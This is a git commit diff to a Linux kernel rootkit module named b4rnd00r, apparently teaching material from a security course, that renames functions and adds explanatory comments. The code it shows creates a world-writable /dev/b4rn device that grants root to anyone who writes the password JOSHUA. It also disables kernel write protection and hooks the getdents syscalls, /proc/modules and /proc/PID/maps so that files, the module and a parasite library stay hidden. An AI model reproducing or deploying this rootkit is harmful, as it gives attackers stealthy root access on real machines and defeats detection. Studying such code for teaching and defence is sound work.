c3e13f701fabe29b0747713accf71a78dc1489aa
Kyle Hale <khale@cs.iit.edu>
2020-02-20 15:05:27 -0600

    better comments, gitignore

--- b4rnd00r.c
+++ b4rnd00r.c
@@ -64,7 +64,7 @@ static int old_egid;
 // write handler for our /dev/b4rn file
 // if the user provides the password JOSHUA, they elevate to root
 static ssize_t
-barn_write (struct file * file, const char * buf, size_t count, loff_t * ppos)
+b4rn_write (struct file * file, const char * buf, size_t count, loff_t * ppos)
 {
 	struct cred * new;
 	char * kbuf = kmalloc(count, GFP_KERNEL);
@@ -91,25 +91,25 @@ barn_write (struct file * file, const char * buf, size_t count, loff_t * ppos)
 
 // NOP: reads on /dev/b4rn don't return anything
 static ssize_t
-barn_read (struct file * file, char * buf, size_t count, loff_t *ppos)
+b4rn_read (struct file * file, char * buf, size_t count, loff_t *ppos)
 {
 	return count;
 }
 
 // boilerplate for /dev files
-static const struct file_operations barnops = {
+static const struct file_operations b4rnops = {
 	.owner = THIS_MODULE,
-	.read  = barn_read,
-	.write = barn_write
+	.read  = b4rn_read,
+	.write = b4rn_write
 };
 
 
 // will appear on /dev/b4rn as a r/w misc char device. 
 // The mode sets the perms to be 0666
-static struct miscdevice barn_dev = {
+static struct miscdevice b4rn_dev = {
 	.minor = MISC_DYNAMIC_MINOR,
 	.name  = "b4rn",
-	.fops  = &barnops,
+	.fops  = &b4rnops,
 	.mode  = S_IFCHR | S_IRUSR |  // char ; 0666
              S_IWUSR | S_IRGRP | 
              S_IWGRP | S_IROTH | 
@@ -141,12 +141,19 @@ tlb_flush_hard (void)
 static inline void
 unprotect_page (unsigned long addr)
 {
+    // This completely turns off write protection for the processor,
+    // so it's a bit of a heavy hammer
 	write_cr0(read_cr0() & (~CR0_WP));
+    // But to be paranoid if the kernel somehow prevents us from doing that,
+    // we can use the more granular routines
 	fixed_set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 1);
+    // the function above edits the page tables. If we don't flush
+    // the TLB, our changes will not take effect for cached PTEs
 	tlb_flush_hard();
 }
 
 
+// inverse of above
 static inline void
 protect_page (unsigned long addr)
 {
@@ -156,7 +163,10 @@ protect_page (unsigned long addr)
 }
 
 
-// our new /proc/modules read handler
+// This is our new malicious /proc/modules read handler. It is
+// essentially getting the output of the *actual* read function,
+// looking for specific strings, and filtering out lines if it
+// gets a match.
 static ssize_t 
 proc_modules_read_new (struct file *f, char __user *buf, size_t len, loff_t *offset) 
 {
@@ -192,6 +202,13 @@ proc_modules_read_new (struct file *f, char __user *buf, size_t len, loff_t *off
 }
 
 
+// This essentially scrubs directory listings of files we don't
+// want to appear. Note the usage of copy_from_user() and copy_to_user().
+// The kernel and the user program live in different address spaces these
+// days (to protect from meltdown attacks), so we cannot just dereference
+// dirent directly (because the virtual address won't make sense!). We have
+// to ask the kernel to translate the address to a kernel address and then
+// copy the data over. 
 static asmlinkage long 
 sys_getdents_new (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) 
 {
@@ -233,6 +250,7 @@ sys_getdents_new (unsigned int fd, struct linux_dirent __user *dirent, unsigned 
 }
 
 
+// same as the above, just different dirent struct layout
 static asmlinkage long 
 sys_getdents64_new (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) 
 {
@@ -295,9 +313,21 @@ find_syscall_table (void)
 }
 
 
+// We need to use a function called "set_memory_rw" to set
+// a page to be writable by the kernel. However, this function
+// is not exported (via EXPORT_SYMBOL()) to kernel modules. We
+// have to find it using a roundabout way, which involves
+// invoking the kernel's linking system
 static int
 init_overrides (void)
 {
+    // this is kind of like the kernel equivalent of dl_sym() from ld's
+    // API. Incidentally, the kernel also exposes all of these symbols
+    // in /proc/kallsyms and are also listed in /boot/System.map-<your-kernel-version>.
+    // If we didn't have access to this API, we could parse those files and
+    // autogen them into a header that this module could include. We're
+    // assigning a function pointer from the address given back to us by
+    // the symbol resolution function here.
     fixed_set_memory_rw = (void*)kallsyms_lookup_name("set_memory_rw");
 
     if (!fixed_set_memory_rw) {
@@ -305,6 +335,7 @@ init_overrides (void)
         return -1;
     }
 
+    // this just reverses the actino of the above
     fixed_set_memory_ro = (void*)kallsyms_lookup_name("set_memory_ro");
     if (!fixed_set_memory_ro) {
         printk(KERN_ERR "Unable to find set_memory_ro\n");
@@ -315,6 +346,10 @@ init_overrides (void)
 }
 
 
+// We first need to find the system call table, which stores thea
+// addresses of system call handler routines for the kernel, and we want
+// to override the one that lists the files in a directory. There happen to be
+// two (getdents and getdents64), so we override both. 
 static int
 init_syscall_tab (void)
 {
@@ -335,9 +370,14 @@ init_syscall_tab (void)
 }
 
 
+// Basically we're going to override the read() function for
+// the /proc/modules file to be our own read function. The symbol
+// corresponding to the structure that holds this read function is
+// not exported to kernel modules however, so we have to go fishing for it.
 static int
 init_proc_mods (void)
 {
+    // We play the same trick, since proc_modules_operations is not 
     proc_modules_operations = (struct file_operations*)kallsyms_lookup_name("proc_modules_operations");
     if (!proc_modules_operations) {
         printk(KERN_ERR "Unable to find module operations address\n");
@@ -347,6 +387,7 @@ init_proc_mods (void)
 	proc_modules_read_orig = proc_modules_operations->read;
 
 	unprotect_page((unsigned long)proc_modules_operations);
+    // the actual override here. You should dive into the read_new function
     proc_modules_operations->read = proc_modules_read_new;
 	protect_page((unsigned long)proc_modules_operations);
 
@@ -354,6 +395,8 @@ init_proc_mods (void)
 }
 
 
+// This is pretty simple, if we find our library
+// int he seq_file's buffer, we remove that entry
 static int
 hide_seq_show (struct seq_file * seq, void * v)
 {
@@ -370,6 +413,10 @@ hide_seq_show (struct seq_file * seq, void * v)
 }
 	
 
+// We had to go fishing in the kernel source 
+// (this is always a good resource for that: https://elixir.bootlin.com/linux/v4.8.17/source/kernel)
+// to figure out how this seq thing works. Once we can figure out that there is a 
+// show() routine, we can override *that*, and filter the original's output.
 static void *
 hook_pid_maps_seq_show (const char * path)
 {
@@ -389,6 +436,7 @@ hook_pid_maps_seq_show (const char * path)
 	seq_show_addr = (unsigned long*)&seq->op->show;
 
 	unprotect_page((unsigned long)seq_show_addr);
+    // here's the override. Go take a look at hide_seq_show()
 	*seq_show_addr = (unsigned long)hide_seq_show;
 	protect_page((unsigned long)seq_show_addr);
 
@@ -397,6 +445,10 @@ hook_pid_maps_seq_show (const char * path)
 }
 
 
+// This one is a little more complicated because the .read entry
+// of for /proc/PID/maps uses the seq_file interface. We can't just
+// override seq_read. Instead we let this one stay, but we override
+// the seq_show function for this specific file
 static int
 init_proc_maps (void)
 {
@@ -414,12 +466,21 @@ init_proc_maps (void)
 }
 
 
+// This is the module's entry point. Invoked when the user
+// calls insmod b4rnd00r.ko (after the kernel loads the module
+// into kernel memory of course)
 static __init int
-rootkit_init (void)
+b4rn_init (void)
 {
     int ret;
 
-	ret = misc_register(&barn_dev);
+    // First set up our /dev/b4rn character device file
+    // Users will access this like so:
+    //   $ echo "some string" > /dev/b4rn
+    // A special string will give the user root
+    // See b4rn_dev's fops structure, specifically
+    // it's read and write handlers (b4rn_read() and b4rn_write()
+	ret = misc_register(&b4rn_dev);
 
 	if (ret) {
 		printk(KERN_ERR "Could not register char device\n");
@@ -434,12 +495,15 @@ rootkit_init (void)
     }
 
 	// hooks /proc/modules (and thus output of lsmod)
+    // This will keep us from appearing in the output of
+    // lsmod
     if (init_proc_mods()) {
         printk(KERN_ERR "Could not init /proc/modules cloaking\n");
         return -1;
     }
 
 	// hooks /proc/<pid>/maps 
+    // this hides our parasite library from the previous lab
 	if (init_proc_maps()) {
 		printk(KERN_ERR "Could not init /proc/maps cloaking\n");
 		return -1;
@@ -452,6 +516,7 @@ rootkit_init (void)
 		return -1;
 	}
 	
+    // have fun
     return 0;
 }
 
@@ -485,14 +550,14 @@ deinit_proc_maps (void)
 
 
 static __exit void
-rootkit_deinit (void)
+b4rn_deinit (void)
 {
+    // this reverses everything that b4rn_init did
 	deinit_syscall_tab();
 	deinit_proc_maps();
 	deinit_proc_mods();
-	misc_deregister(&barn_dev);
+	misc_deregister(&b4rn_dev);
 }
 
-
-module_init(rootkit_init);
-module_exit(rootkit_deinit);
+module_init(b4rn_init);
+module_exit(b4rn_deinit);
